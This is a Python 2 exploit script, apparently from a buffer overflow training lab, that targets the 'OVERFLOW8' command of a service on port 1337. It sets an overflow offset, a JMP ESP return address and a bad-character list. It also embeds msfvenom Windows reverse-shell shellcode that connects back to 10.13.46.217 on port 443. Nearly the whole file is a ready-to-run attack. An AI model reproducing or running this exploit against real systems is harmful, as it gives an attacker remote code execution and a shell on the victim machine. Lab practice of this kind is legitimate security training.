#!/usr/bin/python

import socket, time, sys

remoteip="10.10.215.6"
remoteport=1337
size=1786
prefix = "OVERFLOW8 "
offset = "A" * size
#jmpesp 625011AF
eip = "\xaf\x11\x50\x62"
#badchars \x00\x1d\x2e\xc7\xee
#msfvenom -p windows/shell_reverse_tcp lhost=10.13.46.217 lport=443 exitfunc=thread -b "\x00\x1d\x2e\xc7\xee" -v esp -f python
esp =  b"\x90" * 16
esp += b"\xdb\xd4\xd9\x74\x24\xf4\x5e\xba\x6f\xe0\xb4\xc9\x33"
esp += b"\xc9\xb1\x52\x83\xc6\x04\x31\x56\x13\x03\x39\xf3\x56"
esp += b"\x3c\x39\x1b\x14\xbf\xc1\xdc\x79\x49\x24\xed\xb9\x2d"
esp += b"\x2d\x5e\x0a\x25\x63\x53\xe1\x6b\x97\xe0\x87\xa3\x98"
esp += b"\x41\x2d\x92\x97\x52\x1e\xe6\xb6\xd0\x5d\x3b\x18\xe8"
esp += b"\xad\x4e\x59\x2d\xd3\xa3\x0b\xe6\x9f\x16\xbb\x83\xea"
esp += b"\xaa\x30\xdf\xfb\xaa\xa5\xa8\xfa\x9b\x78\xa2\xa4\x3b"
esp += b"\x7b\x67\xdd\x75\x63\x64\xd8\xcc\x18\x5e\x96\xce\xc8"
esp += b"\xae\x57\x7c\x35\x1f\xaa\x7c\x72\x98\x55\x0b\x8a\xda"
esp += b"\xe8\x0c\x49\xa0\x36\x98\x49\x02\xbc\x3a\xb5\xb2\x11"
esp += b"\xdc\x3e\xb8\xde\xaa\x18\xdd\xe1\x7f\x13\xd9\x6a\x7e"
esp += b"\xf3\x6b\x28\xa5\xd7\x30\xea\xc4\x4e\x9d\x5d\xf8\x90"
esp += b"\x7e\x01\x5c\xdb\x93\x56\xed\x86\xfb\x9b\xdc\x38\xfc"
esp += b"\xb3\x57\x4b\xce\x1c\xcc\xc3\x62\xd4\xca\x14\x84\xcf"
esp += b"\xab\x8a\x7b\xf0\xcb\x83\xbf\xa4\x9b\xbb\x16\xc5\x77"
esp += b"\x3b\x96\x10\xd7\x6b\x38\xcb\x98\xdb\xf8\xbb\x70\x31"
esp += b"\xf7\xe4\x61\x3a\xdd\x8c\x08\xc1\xb6\xb8\xc1\xe7\x9f"
esp += b"\xd5\xdb\xf7\x1e\x9d\x55\x11\x4a\xf1\x33\x8a\xe3\x68"
esp += b"\x1e\x40\x95\x75\xb4\x2d\x95\xfe\x3b\xd2\x58\xf7\x36"
esp += b"\xc0\x0d\xf7\x0c\xba\x98\x08\xbb\xd2\x47\x9a\x20\x22"
esp += b"\x01\x87\xfe\x75\x46\x79\xf7\x13\x7a\x20\xa1\x01\x87"
esp += b"\xb4\x8a\x81\x5c\x05\x14\x08\x10\x31\x32\x1a\xec\xba"
esp += b"\x7e\x4e\xa0\xec\x28\x38\x06\x47\x9b\x92\xd0\x34\x75"
esp += b"\x72\xa4\x76\x46\x04\xa9\x52\x30\xe8\x18\x0b\x05\x17"
esp += b"\x94\xdb\x81\x60\xc8\x7b\x6d\xbb\x48\x9b\x8c\x69\xa5"
esp += b"\x34\x09\xf8\x04\x59\xaa\xd7\x4b\x64\x29\xdd\x33\x93"
esp += b"\x31\x94\x36\xdf\xf5\x45\x4b\x70\x90\x69\xf8\x71\xb1"

buffer = prefix + offset + eip + esp
while True:

    print "Fuzzing with %s bytes" % len(buffer)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((remoteip, remoteport))
    except:
        print ("[-] Connection error!")
        sys.exit(1)

    print s.recv(1024)
    s.send(buffer + '\r\n')
    print s.recv(1024)
    s.close()
    time.sleep(1)
    size += 100
    buffer = "A" * size
    print "-------------------------"
